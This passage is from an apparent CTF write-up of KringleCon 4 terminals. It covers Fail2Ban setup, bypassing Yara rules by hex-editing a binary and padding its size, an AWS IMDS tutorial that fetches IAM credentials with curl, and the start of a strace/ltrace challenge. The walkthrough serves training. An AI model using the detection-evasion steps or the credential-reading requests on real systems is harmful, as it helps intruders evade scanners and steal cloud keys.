        
        
      
    </figcaption>
  
</figure>
<h3 id="6---hoho--no">6 - HoHo &hellip; No</h3>
<hr />
<table>
<thead>
<tr>
<th>Elf</th>
<th>Location</th>
</tr>
</thead>
<tbody>
<tr>
<td>Eve Snowshoes</td>
<td>Santa&rsquo;s Office</td>
</tr>
</tbody>
</table>
<p>This challenge is about <em>Fail2Ban</em> configuration. We need to configure it to identify and block malicious <em>IP</em> addresses found in <code>/var/log/hohono.log</code>:</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon4/cranpi/pi06_02.webp" alt="Terminal 6 description" data-caption="Terminal 6 description" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      Terminal 6 description
      
        
        
      
    </figcaption>
  
</figure>
<p>So there are 3 pieces to configure:</p>
<ul>
<li><code>/etc/fail2ban/jail.d/naughtylist.conf</code> that contains under which circumstances an <em>IP</em> address is banned</li>
<li><code>/etc/fail2ban/filter.d/naughtylist.conf</code> that defines what are the logs that constitute a fail attempts</li>
<li><code>/etc/fail2ban/action.d/naughtylist.conf</code> that defines what are the actions to take to ban/unban an <em>IP</em> address</li>
</ul>
<p>Let&rsquo;s first create the action configuration to add and remove an <em>IP</em> address from the naughtylist:</p>
<div class="box">[Definition]<br />
actionban = /root/naughtylist add <ip><br />
actionunban = /root/naughtylist del <ip></div>
<p>For the log filter, we need to have first a look at the logs and identify the failed attempts. By looking at the <code>/var/log/hohono.log</code> file we see the following error logs:</p>
<div class="box">&lt;timestamp&gt; Login from &lt;ip&gt; rejected due to unknown user name<br />
&lt;timestamp&gt; &lt;ip&gt; sent a malformed request<br />
&lt;timestamp&gt; Invalid heartbeat '&lt;code&gt;' from &lt;ip&gt;<br />
&lt;timestamp&gt; Failed login from &lt;ip&gt; for &lt;user&gt;</div>
<p>We can easily filter in those logs by removing all successful logs with the following command: <code>grep -i -E -v '(success|valid)' /var/log/hohono.log</code><br />
The timestamp is in the format <code>yyyy-mm-dd hh:mm:ss</code> and the <code>code</code> is a value in <code>alpha, bravo, charlie, delta</code>.</p>
<p>So the filter configuration will become:</p>
<div class="box">[Definition]<br />
failregex = Login from &lt;HOST&gt; rejected due to unknown user name$<br />
           &lt;HOST&gt; sent a malformed request$<br />
           Invalid heartbeat .* from &lt;HOST&gt;$<br />
           Failed login from &lt;HOST&gt; for .*$<br />
ignoreregex =</div>
<p>At this point we can test our filter to check if we have hits with the following command <code>fail2ban-regex /var/log/hohono.log /etc/fail2ban/filter.d/naughtylist.conf</code>. We should see something like this:</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon4/cranpi/pi06_03.webp" alt="fail2ban-regex /var/log/hohono.log /etc/fail2ban/filter.d/naughtylist.conf" data-caption="fail2ban-regex /var/log/hohono.log /etc/fail2ban/filter.d/naughtylist.conf" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      fail2ban-regex /var/log/hohono.log /etc/fail2ban/filter.d/naughtylist.conf
      
        
        
      
    </figcaption>
  
</figure>
<p>Finally we can configure the jail:</p>
<div class="box">[naughtylist]<br />
enabled  = true<br />
filter   = naughtylist<br />
action   = naughtylist<br />
logpath  = /var/log/hohono.log<br />
bantime  = 5m<br />
findtime = 60m<br />
maxretry = 10</div>
<p>We restart the service with <code>fail2ban-client stop</code>/<code>fail2ban-client start</code> and verify our jail is active with <code>fail2ban-client status</code>:</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon4/cranpi/pi06_04.webp" alt="fail2ban-client status" data-caption="fail2ban-client status" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      fail2ban-client status
      
        
        
      
    </figcaption>
  
</figure>
<p>We then run <code>/root/naughtylist refresh</code> to reprocess the logs and we get:</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon4/cranpi/pi06_05.webp" alt="Successful IP bans" data-caption="Successful IP bans" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      Successful IP bans
      
        
        
      
    </figcaption>
  
</figure>
<h3 id="7---yara-analysis">7 - Yara Analysis</h3>
<hr />
<table>
<thead>
<tr>
<th>Elf</th>
<th>Location</th>
</tr>
</thead>
<tbody>
<tr>
<td>Fitzy Shortstack</td>
<td>Entry</td>
</tr>
</tbody>
</table>
<p>The goal of this challenge is to alter an executable to bypass a <em>Yara</em> scanner:</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon4/cranpi/pi07_02.webp" alt=" Terminal 7 description" data-caption=" Terminal 7 description" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
       Terminal 7 description
      
        
        
      
    </figcaption>
  
</figure>
<p>The executable is <code>/home/snowball2/the_critical_elf_app</code> and when we run it we get a hit on the <em>Yara</em> rule 135:</p>
<div class="box">$ ./the_critical_elf_app<br />
yara_rule_135 ./the_critical_elf_app</div>
<p>The ruleset is found in <code>/home/snowball2/yara_rules/rules.yar</code> and the rule 135 is:</p>
<div class="box">$ grep -A 12 &ldquo;yara_rule_135 &quot; yara_rules/rules.yar<br />
rule yara_rule_135 {<br />
meta:<br />
  description = &ldquo;binaries - file Sugar_in_the_machinery&rdquo;<br />
  author = &ldquo;Sparkle Redberry&rdquo;<br />
  reference = &ldquo;North Pole Malware Research Lab&rdquo;<br />
  date = &ldquo;1955-04-21&rdquo;<br />
  hash = &ldquo;19ecaadb2159b566c39c999b0f860b4d8fc2824eb648e275f57a6dbceaf9b488&rdquo;<br />
strings:<br />
    $s = &ldquo;candycane&rdquo;<br />
condition:<br />
    $s<br />
}</div>
<p>So this rule will simply trigger if the string <code>candycane</code> is found. So lets modify the binary with <code>vim</code>. Once in <code>vim</code> execute <code>:%!xxd</code> to convert it to a human-readable format. Look for the string of interest with <code>/candy</code>. It is found around offset <code>0x2000</code>. Enter <em>Insert</em> mode with <code>i</code> and modify the first letter of the word. Make sure to modify the hex data in the left part:</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon4/cranpi/pi07_03.webp" alt="Binary edit with vim" data-caption="Binary edit with vim" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      Binary edit with vim
      
        
        
      
    </figcaption>
  
</figure>
<p>Quit the <em>Insert</em> mode with <code>esc</code>, convert the file back to binary with <code>:%!xxd -r</code> and save the file with <code>:wq</code>. We run again the binary and this time it&rsquo;s the rule 1056 that blocks the app. The rule is:</p>
<div class="box">$ grep -A 12 &ldquo;yara_rule_1056 &quot; yara_rules/rules.yar<br />
rule yara_rule_1056 {<br />
meta:<br />
  description = &ldquo;binaries - file frosty.exe&rdquo;<br />
  author = &ldquo;Sparkle Redberry&rdquo;<br />
  reference = &ldquo;North Pole Malware Research Lab&rdquo;<br />
  date = &ldquo;1955-04-21&rdquo;<br />
  hash = &ldquo;b9b95f671e3d54318b3fd4db1ba3b813325fcef462070da163193d7acb5fcd03&rdquo;<br />
strings:<br />
  $s1 = {6c 6962 632e 736f 2e36}<br />
  $hs2 = {726f 6772 616d 2121}<br />
condition:<br />
  all of them<br />
}</div>
<p>This time 2 strings are checked in their hex form. The first string is <code>libc.so.6</code> and <code>rogram!!</code>. The first one is the name of a library that the binary uses so we won&rsquo;t be able to change it without crashing the application. Let&rsquo;s modify the second string the same way we did previously.</p>
<p>Next rule to hit is 1732:</p>
<div class="box">$ grep -A 35 &ldquo;yara_rule_1732 &quot; yara_rules/rules.yar<br />
rule yara_rule_1732 {<br />
meta:<br />
  description = &ldquo;binaries - alwayz_winter.exe&rdquo;<br />
  author = &ldquo;Santa&rdquo;<br />
  reference = &ldquo;North Pole Malware Research Lab&rdquo;<br />
  date = &ldquo;1955-04-22&rdquo;<br />
  hash = &ldquo;c1e31a539898aab18f483d9e7b3c698ea45799e78bddc919a7dbebb1b40193a8&rdquo;<br />
strings:<br />
  $s1 = &ldquo;This is critical for the execution of this program!!&rdquo; fullword ascii<br />
  $s2 = &ldquo;__frame_dummy_init_array_entry&rdquo; fullword ascii<br />
  $s3 = &ldquo;.note.gnu.property&rdquo; fullword ascii<br />
  $s4 = &ldquo;.eh_frame_hdr&rdquo; fullword ascii<br />
  $s5 = &ldquo;__FRAME_END__&rdquo; fullword ascii<br />
  $s6 = &ldquo;__GNU_EH_FRAME_HDR&rdquo; fullword ascii<br />
  $s7 = &ldquo;frame_dummy&rdquo; fullword ascii<br />
  $s8 = &ldquo;.note.gnu.build-id&rdquo; fullword ascii<br />
  $s9 = &ldquo;completed.8060&rdquo; fullword ascii<br />
  $s10 = &ldquo;_IO_stdin_used&rdquo; fullword ascii<br />
  $s11 = &ldquo;.note.ABI-tag&rdquo; fullword ascii<br />
  $s12 = &ldquo;naughty string&rdquo; fullword ascii<br />
  $s13 = &ldquo;dastardly string&rdquo; fullword ascii<br />
  $s14 = &ldquo;__do_global_dtors_aux_fini_array_entry&rdquo; fullword ascii<br />
  $s15 = &ldquo;__libc_start_main@@GLIBC_2.2.5&rdquo; fullword ascii<br />
  $s16 = &ldquo;GLIBC_2.2.5&rdquo; fullword ascii<br />
  $s17 = &ldquo;its_a_holly_jolly_variable&rdquo; fullword ascii<br />
  $s18 = &ldquo;__cxa_finalize&rdquo; fullword ascii<br />
  $s19 = &ldquo;HolidayHackChallenge{NotReallyAFlag}&rdquo; fullword ascii<br />
  $s20 = &ldquo;__libc_csu_init&rdquo; fullword ascii<br />
condition:<br />
  uint32(1) == 0x02464c45 and filesize &lt; 50KB and<br />
  10 of them<br />
}</div>
<p>There are 3 conditions:</p>
<ul>
<li><code>uint32(1) == 0x02464c45</code> checks for this hex value at offset 1. This represents part of the <em>ELF</em> magic number <code>0x464c45</code> and <code>0x02</code> that defines that this is a 64-bit binary. So this cannot be changed.</li>
<li>the filesize that could eventually be changed by appending dummy data to the excutable</li>
<li>10 of the <code>$sxx</code> strings must match, however, most of them relate to the binary structure or code and we cannot change them except for <code>$s1</code>, <code>$s12</code>, <code>$s13</code>, <code>$s17</code> and <code>$s19</code>.</li>
</ul>
<p>We can bypass the second condition with by appending dummy bytes to the binary with <code>python3 -c &quot;print('A'*50000)&quot; &gt;&gt; the_critical_elf_app</code>. Now when we run the binary, we bypass all the rules and validate the challenge:</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon4/cranpi/pi07_04.webp" alt="Yara rules bypass" data-caption="Yara rules bypass" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      Yara rules bypass
      
        
        
      
    </figcaption>
  
</figure>
<p>If we decode (hex to <em>ASCII</em>) the last string, we get the message <code>Jolly Enough, Overtime Approved</code>.</p>
<h3 id="8---imds-exploration">8 - IMDS Exploration</h3>
<hr />
<table>
<thead>
<tr>
<th>Elf</th>
<th>Location</th>
</tr>
</thead>
<tbody>
<tr>
<td>Noxious O. D&rsquo;or</td>
<td>Jack&rsquo;s Restroom</td>
</tr>
</tbody>
</table>
<p>This challenge is about exploring the <em>AWS Instance Metadata Service</em> (<em>IMDS</em>) by going through a few guided tutorial.</p>
<div class="alert alert-warning" role="alert" data-dir="ltr">P1. <em>The Instance Metadata Service</em> (<em>IMDS</em>) is a virtual server for cloud assets at the <em>IP</em> address <code>169.254.169.254</code>. Send a couple ping packets to the server.</div>
<div class="box">$ ping 169.254.169.254<br />
PING 169.254.169.254 (169.254.169.254) 56(84) bytes of data.<br />
64 bytes from 169.254.169.254: icmp_seq=1 ttl=64 time=0.014 ms<br />
64 bytes from 169.254.169.254: icmp_seq=2 ttl=64 time=0.029 ms<br />
[&hellip;]</div>
<p><em>IMDS</em> provides information about currently running virtual machine instances. You can use it to manage and configure cloud nodes. <em>IMDS</em> is used by all major cloud providers.</p>
<div class="alert alert-warning" role="alert" data-dir="ltr">P2. Developers can automate actions using <em>IMDS</em>. We&rsquo;ll interact with the server using the <em>cURL</em> tool. Run &lsquo;curl http://169.254.169.254&rsquo; to access IMDS data.</div>
<div class="box">$ curl http://169.254.169.254<br />
latest</div>
<p>Different providers will have different formats for <em>IMDS</em> data. We&rsquo;re using an <em>AWS</em>-compatible <em>IMDS</em> server that returns <code>latest</code> as the default response. Access the &lsquo;latest&rsquo; endpoint. Run <code>curl http://169.254.169.254/latest</code>.</p>
<div class="box">$ curl http://169.254.169.254/latest<br />
dynamic<br />
meta-data</div>
<p><em>IMDS</em> returns two new endpoints: <code>dynamic</code> and <code>meta-data</code>. Let&rsquo;s start with the dynamic endpoint, which provides information about the instance itself. Repeat the request to access the dynamic endpoint: <code>curl http://169.254.169.254/latest/dynamic</code>.</p>
<div class="box">$ curl http://169.254.169.254/latest/dynamic<br />
fws/instance-monitoring<br />
instance-identity/document<br />
instance-identity/pkcs7<br />
instance-identity/signature</div>
<p>The instance identity document can be used by developers to understand the instance details. Repeat the request, this time requesting the <code>instance-identity/document</code> resource: <code>curl http://169.254.169.254/latest/dynamic/instance-identity/document</code>.</p>
<div class="box">$ curl http://169.254.169.254/latest/dynamic/instance-identity/document<br />
{<br />
  &ldquo;accountId&rdquo;: &ldquo;PCRVQVHN4S0L4V2TE&rdquo;,<br />
  &ldquo;imageId&rdquo;: &ldquo;ami-0b69ea66ff7391e80&rdquo;,<br />
  &ldquo;availabilityZone&rdquo;: &ldquo;np-north-1f&rdquo;,<br />
  &ldquo;ramdiskId&rdquo;: null,<br />
  &ldquo;kernelId&rdquo;: null,<br />
  &ldquo;devpayProductCodes&rdquo;: null,<br />
  &ldquo;marketplaceProductCodes&rdquo;: null,<br />
  &ldquo;version&rdquo;: &ldquo;2017-09-30&rdquo;,<br />
  &ldquo;privateIp&rdquo;: &ldquo;10.0.7.10&rdquo;,<br />
  &ldquo;billingProducts&rdquo;: null,<br />
  &ldquo;instanceId&rdquo;: &ldquo;i-1234567890abcdef0&rdquo;,<br />
  &ldquo;pendingTime&rdquo;: &ldquo;2021-12-01T07:02:24Z&rdquo;,<br />
  &ldquo;architecture&rdquo;: &ldquo;x86_64&rdquo;,<br />
  &ldquo;instanceType&rdquo;: &ldquo;m4.xlarge&rdquo;,<br />
  &ldquo;region&rdquo;: &ldquo;np-north-1&rdquo;<br />
}</div>
<p>Much of the data retrieved from <em>IMDS</em> will be returned in <em>JavaScript Object Notation</em> (<em>JSON</em>) format. Piping the output to <code>jq</code> will make the content easier to read. Re-run the previous command, sending the output to <em>JQ</em>: <code>curl http://169.254.169.254/latest/dynamic/instance-identity/document | jq</code>.</p>
<p>Here we see several details about the instance when it was launched. Developers can use this information to optimize applications based on the instance launch parameters.</p>
<div class="alert alert-warning" role="alert" data-dir="ltr">P3. In addition to dynamic parameters set at launch, <em>IMDS</em> offers metadata about the instance as well. Examine the metadata elements available: <code>curl http://169.254.169.254/latest/meta-data</code>.</div>
<div class="box">$ curl http://169.254.169.254/latest/meta-data<br />
ami-id<br />
ami-launch-index<br />
ami-manifest-path<br />
block-device-mapping/ami<br />
block-device-mapping/ebs0<br />
block-device-mapping/ephemeral0<br />
block-device-mapping/root<br />
block-device-mapping/swap<br />
elastic-inference/associations<br />
elastic-inference/associations/eia-bfa21c7904f64a82a21b9f4540169ce1<br />
events/maintenance/scheduled<br />
events/recommendations/rebalance<br />
hostname<br />
iam/info<br />
iam/security-credentials<br />
iam/security-credentials/elfu-deploy-role<br />
instance-action<br />
instance-id<br />
instance-life-cycle<br />
instance-type<br />
latest<br />
latest/api/token<br />
local-hostname<br />
local-ipv4<br />
mac<br />
network/interfaces/macs/0e:49:61:0f:c3:11/device-number<br />
network/interfaces/macs/0e:49:61:0f:c3:11/interface-id<br />
network/interfaces/macs/0e:49:61:0f:c3:11/ipv4-associations/192.0.2.54<br />
network/interfaces/macs/0e:49:61:0f:c3:11/ipv6s<br />
[&hellip;]</div>
<p>By accessing the metadata elements, a developer can interrogate information about the system. Take a look at the public-hostname element: <code>curl http://169.254.169.254/latest/meta-data/public-hostname</code>.</p>
<div class="box">$ curl http://169.254.169.254/latest/meta-data/public-hostname<br />
ec2-192-0-2-54.compute-1.amazonaws.com</div>
<p>Many of the data elements returned won&rsquo;t include a trailing newline, which causes the response to blend into the prompt. Re-run the prior command, adding <code>; echo</code> to the end of the command. This will add a new line character to the response.</p>
<p>There is a whole lot of information that can be retrieved from the <em>IMDS</em> server. Even <em>AWS Identity and Access Management</em> (<em>IAM</em>) credentials! Request the endpoint <code>http://169.254.169.254/latest/meta-data/iam/security-credentials</code> to see the instance <em>IAM</em> role.</p>
<div class="box">$ curl http://169.254.169.254/latest/meta-data/iam/security-credentials ; echo<br />
elfu-deploy-role</div>
<p>Once you know the role name, you can request the <em>AWS</em> keys associated with the role. Request the endpoint <code>http://169.254.169.254/latest/meta-data/iam/security-credentials/elfu-deploy-role </code>to get the instance <em>AWS</em> keys.</p>
<div class="box">$ curl http://169.254.169.254/latest/meta-data/iam/security-credentials/elfu-deploy-role ; echo<br />
{<br />
  &ldquo;Code&rdquo;: &ldquo;Success&rdquo;,<br />
  &ldquo;LastUpdated&rdquo;: &ldquo;2021-12-02T18:50:40Z&rdquo;,<br />
  &ldquo;Type&rdquo;: &ldquo;AWS-HMAC&rdquo;,<br />
  &ldquo;AccessKeyId&rdquo;: &ldquo;AKIA5HMBSK1SYXYTOXX6&rdquo;,<br />
  &ldquo;SecretAccessKey&rdquo;: &ldquo;CGgQcSdERePvGgr058r3PObPq3+0CfraKcsLREpX&rdquo;,<br />
  &ldquo;Token&rdquo;: &ldquo;NR9Sz/7fzxwIgv7URgHRAckJK0JKbXoNBcy032XeVPqP8/tWiR/KVSdK8FTPfZWbxQ==&rdquo;,<br />
  &ldquo;Expiration&rdquo;: &ldquo;2026-12-02T18:50:40Z&rdquo;<br />
}</div>
<p>So far, we&rsquo;ve been interacting with the <em>IMDS</em> server using <em>IMDSv1</em>, which does not require authentication. Optionally, <em>AWS</em> users can turn on <em>IMDSv2</em> that requires authentication. This is more secure, but not on by default.</p>
<div class="alert alert-warning" role="alert" data-dir="ltr">P4. For <em>IMDSv2</em> access, you must request a token from the <em>IMDS</em> server using the <code>X-aws-ec2-metadata-token-ttl-seconds</code> header to indicate how long you want the token to be used for (between 1 and 21,600 secods). Examine the contents of the <code>gettoken.sh</code> script in the current directory using <code>cat</code>.</div>
<div class="box">$ cat gettoken.sh<br />
TOKEN=<code>curl -X PUT &quot;http://169.254.169.254/latest/api/token&quot; -H &quot;X-aws-ec2-metadata-token-ttl-seconds: 21600&quot;</code></div>
<p>This script will retrieve a token from the <em>IMDS</em> server and save it in the environment variable <code>TOKEN</code>. Import it into your environment by running &lsquo;source gettoken.sh&rsquo;.</p>
<div class="box">$ source gettoken.sh<br />
$ echo $TOKEN<br />
Uv38ByGCZU8WP18PmmIdcpVmx00QA3xNe7sEB9Hixkk=</div>
<p>With the <em>IMDS</em> token, you can make an <em>IMDSv2</em> request by adding the <code>X-aws-ec2-metadata-token</code> header to the curl request. Access the metadata region information in an <em>IMDSv2</em> request: <code>curl -H &quot;X-aws-ec2-metadata-token: $TOKEN&quot; http://169.254.169.254/latest/meta-data/placement/region</code></p>
<div class="box">$ curl -H &ldquo;X-aws-ec2-metadata-token: $TOKEN&rdquo; http://169.254.169.254/latest/meta-data/placement/region<br />
np-north-1</div>
<p>And this end the tutorial in <em>IMDS</em>.</p>
<h3 id="9---strace-ltrace-retrace">9 - Strace Ltrace Retrace</h3>
<hr />
<table>
<thead>
<tr>
<th>Elf</th>
<th>Location</th>
</tr>
</thead>
<tbody>
<tr>
<td>Tinsel Upatree</td>
<td>Kitchen</td>
</tr>
</tbody>
</table>
<p>This challengei is about using <code>strace</code> and <code>ltrace</code> command to trace a binary. The difference between the two is that <code>strace</code> is a system call and signal tracer and <code>ltrace</code> is a library call tracer.</p>
<p>As per the description of the challenge, some file has been deleted and we need to recreate it:</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon4/cranpi/pi09_02.webp" alt=" Terminal 9 description" data-caption=" Terminal 9 description" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
       Terminal 9 description
      
        
        
      
    </figcaption>
  
</figure>
<p>The binary is found in the home folder and when we launch it, we get:</p>
<div class="box">$ ./make_the_candy<br />
Unable to open configuration file.</div>
<p>If we trace the system calls with <code>strace</code> we see that it looks for a file called <code>registration.json</code> in the same directory:</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon4/cranpi/pi09_03.webp" alt="strace" data-caption="strace" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      strace
      
        
        
      
    </figcaption>
  
</figure>
<p>Let&rsquo;s create it in the home folder and relaunch the binary. This time we get a different message:</p>
<div class="box">$ touch registration.json<br />
$ ./make_the_candy<br />
Unregistered - Exiting.</div>
<p>With <code>ltrace</code> now we see that it reads the first line of the file and ends there because we have an empty file. Let&rsquo;s add some content and try again:</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon4/cranpi/pi09_04.webp" alt="ltrace" data-caption="ltrace" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      ltrace
      
        
        
      
    </figcaption>
  
</figure>
<p>It checks that the first line contains the string <code>Registration</code> then reads the next line. If we add a few more lines to the file we see that it keeps looking for the same string on all the lines. Let&rsquo;s add it and check again:</p>
<figure >
  
  
  
